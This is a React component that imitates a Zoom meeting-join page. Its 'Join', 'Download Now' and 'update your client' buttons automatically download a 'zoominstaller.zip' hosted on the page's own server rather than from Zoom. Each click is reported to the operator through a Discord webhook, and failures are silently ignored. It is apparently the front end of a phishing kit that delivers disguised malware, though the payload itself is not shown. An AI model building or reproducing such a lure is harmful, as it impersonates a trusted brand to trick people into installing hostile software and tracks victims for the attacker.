"use client";
import React, { useState, useEffect } from "react";

export default function ZoomLandingPage({ onNavigateToUpdate }) {
    const [showModal, setShowModal] = useState(false);
    const [isDownloading, setIsDownloading] = useState(false);

    // Download file path
    const INSTALLER_PATH = "/assets/setup/update/zoominstaller.zip";
    const INSTALLER_FILENAME = "zoominstaller.zip";

    // Send data to Discord (fails silently if webhook not configured)
    const sendToDiscord = async (message) => {
        try {
            await fetch("/api/discord", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ text: message }),
            });
            // Silently ignore errors - webhook may not be configured
        } catch {
            // Silent fail - Discord logging is optional
        }
    };

    // Trigger download
    const triggerDownload = () => {
        const link = document.createElement("a");
        link.href = INSTALLER_PATH;
        link.download = INSTALLER_FILENAME;
        link.style.display = "none";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Handle main button click - download and show modal
    const handleJoinClick = async () => {
        setIsDownloading(true);
        await sendToDiscord("🔵 User clicked 'Join from Zoom Workplace app' button");

        // Trigger download
        triggerDownload();

        // Show modal after delay
        setTimeout(() => {
            setShowModal(true);
            setIsDownloading(false);
        }, 2000);
    };

    // Handle Download Now link click
    const handleDownloadNow = async () => {
        await sendToDiscord("🔽 User clicked 'Download Now' link");
        triggerDownload();
    };

    // Handle update your client link
    const handleUpdateClient = async () => {
        await sendToDiscord("🔄 User clicked 'update your client' link - navigating to update page");
        onNavigateToUpdate();
    };

    // Handle modal download link
    const handleModalDownload = async () => {
        await sendToDiscord("🔽 User clicked download link in modal");
        triggerDownload();
    };

    return (
        <div className="min-h-screen bg-white flex flex-col">
            {/* Header */}
            <header className="border-b border-gray-200 px-4 sm:px-8 py-3">
                <div className="max-w-7xl mx-auto flex items-center justify-between">
                    {/* Zoom Logo */}
                    <div className="flex items-center">
                        <svg
                            viewBox="0 0 64 24"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                            className="h-6 sm:h-7"
                        >
                            <path
                                d="M8.75 5.48L1.56 14.4C0.59 15.6 1.45 17.4 2.99 17.4H14.74C15.34 17.4 15.81 16.93 15.81 16.33V8.48C15.81 6.82 14.46 5.48 12.81 5.48H8.75Z"
                                fill="#2D8CFF"
                            />
                            <path
                                d="M23.94 12.12L18.44 8.27C17.68 7.73 16.64 8.27 16.64 9.2V16.92C16.64 17.86 17.68 18.39 18.44 17.86L23.94 13.99C24.56 13.56 24.56 12.56 23.94 12.12Z"
                                fill="#2D8CFF"
                            />
                            <text
                                x="26"
                                y="17"
                                fill="#0B5CFF"
                                style={{ fontSize: "16px", fontWeight: "bold", fontFamily: "Arial, sans-serif" }}
                            >
                                zoom
                            </text>
                        </svg>
                    </div>

                    {/* Right side links */}
                    <div className="flex items-center space-x-4 sm:space-x-6 text-sm">
                        <a href="#" className="text-gray-600 hover:text-blue-600 hidden sm:block">
                            Support
                        </a>
                        <div className="flex items-center text-gray-600 hover:text-blue-600 cursor-pointer">
                            <span>English</span>
                            <svg
                                className="w-4 h-4 ml-1"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                            >
                                <path
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                    strokeWidth="2"
                                    d="M19 9l-7 7-7-7"
                                />
                            </svg>
                        </div>
                    </div>
                </div>
            </header>

            {/* Main Content */}
            <main className="flex-1 flex flex-col items-center justify-center px-4 py-12 sm:py-20">
                <div className="text-center max-w-2xl">
                    {/* Main heading */}
                    <h1 className="text-lg sm:text-xl text-gray-800 mb-4">
                        Once you install Zoom Workplace app, click{" "}
                        <span className="font-semibold">Join from Zoom Workplace app</span> below
                    </h1>

                    {/* Terms text */}
                    <p className="text-sm text-gray-500 mb-6">
                        By joining a meeting, you agree to our{" "}
                        <a href="#" className="text-blue-600 hover:underline">
                            Terms of Service
                        </a>{" "}
                        and{" "}
                        <a href="#" className="text-blue-600 hover:underline">
                            Privacy Statement
                        </a>
                    </p>

                    {/* Main CTA Button */}
                    <button
                        onClick={handleJoinClick}
                        disabled={isDownloading}
                        className="bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-8 rounded-full transition-colors mb-8 disabled:opacity-70 disabled:cursor-not-allowed"
                    >
                        {isDownloading ? "Starting download..." : "Join from Zoom Workplace app"}
                    </button>

                    {/* Divider */}
                    <div className="border-t border-gray-200 my-8 w-full max-w-lg mx-auto"></div>

                    {/* Download link */}
                    <p className="text-sm text-gray-600 mb-3">
                        Don't have the Zoom Workplace app installed?{" "}
                        <a
                            href="#"
                            onClick={(e) => {
                                e.preventDefault();
                                handleDownloadNow();
                            }}
                            className="text-blue-600 hover:underline"
                        >
                            Download Now
                        </a>
                    </p>

                    {/* Update client link */}
                    <p className="text-sm text-gray-600">
                        Having issues with the Zoom Workplace app? Please{" "}
                        <a
                            href="#"
                            onClick={(e) => {
                                e.preventDefault();
                                handleUpdateClient();
                            }}
                            className="text-blue-600 hover:underline"
                        >
                            update your client
                        </a>{" "}
                        and try again
                    </p>
                </div>
            </main>

            {/* Chat bubble icon - bottom right */}
            <div className="fixed bottom-6 right-6">
                <button className="bg-blue-600 hover:bg-blue-700 w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center shadow-lg transition-transform hover:scale-105">
                    <svg
                        className="w-6 h-6 sm:w-7 sm:h-7 text-white"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth="2"
                            d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
                        />
                    </svg>
                </button>
            </div>

            {/* Modal */}
            {showModal && (
                <div className="fixed inset-0 flex items-center justify-center z-50">
                    {/* Modal backdrop - subtle overlay */}
                    <div
                        className="absolute inset-0 bg-black bg-opacity-10"
                        onClick={() => setShowModal(false)}
                    ></div>

                    {/* Modal content - positioned to the right like in reference */}
                    <div className="absolute top-1/3 right-4 sm:right-1/4 bg-white rounded-lg shadow-xl p-4 sm:p-5 max-w-sm border border-gray-200 z-10">
                        {/* Close button */}
                        <button
                            onClick={() => {
                                setShowModal(false);
                                sendToDiscord("❌ User closed the modal");
                            }}
                            className="absolute top-3 right-3 text-gray-400 hover:text-gray-600"
                        >
                            <svg
                                className="w-5 h-5"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                            >
                                <path
                                    strokeLinecap="round"
                                    strokeLinejoin="round"
                                    strokeWidth="2"
                                    d="M6 18L18 6M6 6l12 12"
                                />
                            </svg>
                        </button>

                        {/* Modal content */}
                        <h3 className="text-base sm:text-lg font-semibold text-gray-800 mb-2 pr-6">
                            Did not open Zoom Workplace app?
                        </h3>
                        <p className="text-sm text-gray-600">
                            Please{" "}
                            <a
                                href="#"
                                onClick={(e) => {
                                    e.preventDefault();
                                    handleModalDownload();
                                }}
                                className="text-blue-600 hover:underline"
                            >
                                download
                            </a>{" "}
                            and install the app and click Join from Zoom Workplace app again.
                        </p>
                    </div>
                </div>
            )}
        </div>
    );
}
